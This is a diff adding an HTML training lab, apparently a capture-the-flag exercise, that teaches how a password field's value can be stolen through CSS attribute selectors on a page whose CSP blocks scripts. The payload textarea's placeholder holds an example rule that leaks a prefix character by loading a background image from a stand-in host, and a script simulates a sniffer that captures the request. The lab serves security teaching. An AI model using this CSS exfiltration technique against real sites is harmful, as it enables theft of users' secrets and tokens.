@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lab 2: CSS Data Exfiltration Challenge</title>
+    <style id="base-styles">
+        :root {
+            --primary: #0284c7;
+            --danger: #ef4444;
+            --bg: #0f172a;
+            --surface: #1e293b;
+            --border: #334155;
+            --text: #f8fafc;
+            --muted: #94a3b8;
+        }
+
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; line-height: 1.6; background-color: var(--bg); color: var(--text); padding: 2rem 1rem; }
+        .container { max-width: 960px; margin: 0 auto; display: flex; flex-direction: column; gap: 2rem; }
+        
+        .card { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 1.5rem; }
+        .card h2 { font-size: 1.25rem; margin-bottom: 0.75rem; color: #38bdf8; }
+
+        .form-group { margin-bottom: 1.25rem; }
+        label { display: block; font-weight: 600; font-size: 0.9rem; margin-bottom: 0.4rem; color: var(--muted); }
+        input[type="password"], input[type="text"], textarea {
+            width: 100%; padding: 0.75rem; font-size: 0.95rem; border: 1px solid var(--border); border-radius: 6px;
+            background: #090d16; color: #f8fafc; font-family: monospace;
+        }
+        
+        .btn { padding: 0.75rem 1.5rem; font-size: 0.95rem; font-weight: 600; border-radius: 6px; border: none; cursor: pointer; }
+        .btn-primary { background: var(--primary); color: #fff; }
+        .btn-primary:hover { background: #0369a1; }
+        
+        .sniffer-box { background: #090d16; border: 1px solid #334155; border-radius: 6px; padding: 1rem; font-family: monospace; font-size: 0.85rem; min-height: 100px; color: #4ade80; overflow-y: auto; max-height: 250px; }
+        .notice { background: rgba(56, 189, 248, 0.1); border-left: 4px solid #38bdf8; padding: 0.75rem 1rem; font-size: 0.9rem; color: #bae6fd; margin-bottom: 1rem; }
+    </style>
+    <!-- Dynamic Injected CSS Block -->
+    <style id="injected-theme-styles"></style>
+</head>
+<body>
+
+    <main class="container">
+        <header>
+            <h1>🎯 Lab 2: CSS Attribute Selector Data Exfiltration Challenge</h1>
+            <p style="color: var(--muted);">Target Application: Vanguard Cloud Key Vault</p>
+        </header>
+
+        <div class="notice">
+            <strong>Security Boundary Notice:</strong> Strict CSP is active (<code style="color: #facc15;">script-src 'none'</code>). You cannot execute JavaScript. Can you extract the secret password character-by-character using only CSS?
+        </div>
+
+        <!-- 1. Victim Vault Secret Section -->
+        <section class="card">
+            <h2>🔐 Protected Vault (Target Secret Input)</h2>
+            <p style="color: var(--muted); font-size: 0.9rem; margin-bottom: 1rem;">
+                The victim user has an active session where an administrative access token is pre-populated in a password input field:
+            </p>
+
+            <div class="form-group">
+                <label for="admin-token">Master Administrative Token:</label>
+                <!-- Target secret input with hidden value -->
+                <input type="password" id="admin-token" name="admin_token" value="FLAG{CSS_3XF1LTR4T10N_M4ST3R}" readonly>
+            </div>
+            <p style="font-size: 0.8rem; color: #64748b;">Hint: The token begins with <code>FLAG{</code>.</p>
+        </section>
+
+        <!-- 2. Vulnerable Theme Injection Area -->
+        <section class="card">
+            <h2>🎨 Custom Dashboard Theme Injector (CSS Injection Vector)</h2>
+            <p style="color: var(--muted); font-size: 0.9rem; margin-bottom: 1rem;">
+                Enter custom CSS to inject into the document. Craft attribute selector rules to exfiltrate the secret:
+            </p>
+
+            <div class="form-group">
+                <label for="css-input">Custom CSS Payload:</label>
+                <textarea id="css-input" rows="7" placeholder="/* Craft your CSS rules here */&#10;input[name='admin_token'][value^='FLAG{C'] {&#10;    background-image: url('http://sniffer.local/leak?char=C');&#10;}"></textarea>
+            </div>
+
+            <button type="button" class="btn btn-primary" onclick="injectCSS()">Apply Custom Theme (Trigger CSS)</button>
+        </section>
+
+        <!-- 3. Network Sniffer Console -->
+        <section class="card">
+            <h2>📡 Local Network Packet Sniffer (Outbound Request Interceptor)</h2>
+            <p style="color: var(--muted); font-size: 0.9rem; margin-bottom: 0.5rem;">
+                Monitors simulated background HTTP requests dispatched by the browser layout engine:
+            </p>
+            <div id="sniffer-log" class="sniffer-box">[Sniffer initialized. Waiting for background HTTP requests...]</div>
+        </section>
+    </main>
+
+    <script>
+        // Intercept simulated CSS background image requests
+        function injectCSS() {
+            const rawCSS = document.getElementById('css-input').value;
+            const styleTag = document.getElementById('injected-theme-styles');
+            const sniffer = document.getElementById('sniffer-log');
+
+            styleTag.textContent = rawCSS;
+
+            // Simulate network sniffer inspecting requested URLs
+            const urlMatches = rawCSS.matchAll(/url\(['"]?([^'"\)]+)['"]?\)/g);
+            let capturedRequests = [];
+
+            const targetVal = document.getElementById('admin-token').value;
+
+            for (const match of urlMatches) {
+                const url = match[1];
+                // Check if the rule's selector actually matches the input value
+                const rulePrefixMatch = rawCSS.match(/value\^=['"]([^'"]+)['"]/);
+                if (rulePrefixMatch) {
+                    const testedPrefix = rulePrefixMatch[1];
+                    if (targetVal.startsWith(testedPrefix)) {
+                        capturedRequests.push(`[PACKET CAPTURED] HTTP GET -> ${url} | Matched Prefix: "${testedPrefix}"`);
+                    }
+                } else if (url.includes("sniffer.local")) {
+                    capturedRequests.push(`[PACKET CAPTURED] HTTP GET -> ${url}`);
+                }
+            }
+
+            if (capturedRequests.length > 0) {
+                sniffer.innerHTML = capturedRequests.map(r => `<div>${r}</div>`).join('') + 
+                                    `<div style="color: #facc15; margin-top: 0.5rem;">[+] Match confirmed by layout engine! Candidate character exfiltrated!</div>`;
+            } else {
+                sniffer.innerHTML = `<div style="color: #94a3b8;">[No matching rules triggered. The selector did not match the input value.]</div>`;
+            }
+        }
+    </script>
+</body>
+</html>
